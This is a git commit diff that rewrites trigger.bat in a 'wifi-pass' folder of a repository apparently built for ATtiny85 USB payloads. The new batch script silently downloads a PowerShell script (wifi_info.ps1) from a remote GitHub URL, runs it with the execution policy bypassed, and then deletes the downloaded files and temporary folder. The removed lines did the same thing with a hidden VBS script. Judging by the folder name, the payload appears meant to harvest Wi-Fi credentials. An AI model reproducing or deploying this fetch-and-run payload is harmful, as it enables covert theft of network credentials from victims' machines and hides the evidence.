94062482bf3ce86812c66cbcd03337ef9e55d686
mrx-arafat <arafatmrx@gmail.com>
2025-01-05 00:12:37 +0600

    trigger

--- wifi-pass/trigger.bat
+++ wifi-pass/trigger.bat
@@ -1,2 +1,20 @@
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mrx-arafat/AtTiny85-Gameplay/main/wifi-pass/run_hidden.vbs' -OutFile %TEMP%\run_hidden.vbs"
-wscript %TEMP%\run_hidden.vbs
+@echo off
+:: Step 1: Create a temporary directory
+set tempDir=%temp%\attiny_scripts
+if not exist %tempDir% mkdir %tempDir%
+
+:: Step 2: Download necessary files
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mrx-arafat/AtTiny85-Gameplay/main/wifi-pass/wifi_info.ps1' -OutFile '%tempDir%\wifi_info.ps1'"
+
+:: Step 3: Change directory to the temporary folder
+cd /d %tempDir%
+
+:: Step 4: Execute the PowerShell script
+powershell -ExecutionPolicy Bypass -File wifi_info.ps1
+
+:: Step 5: Clean up - Delete all downloaded files and temporary directory
+cd /d %temp%
+rd /s /q %tempDir%
+
+:: Step 6: Exit CMD
+exit
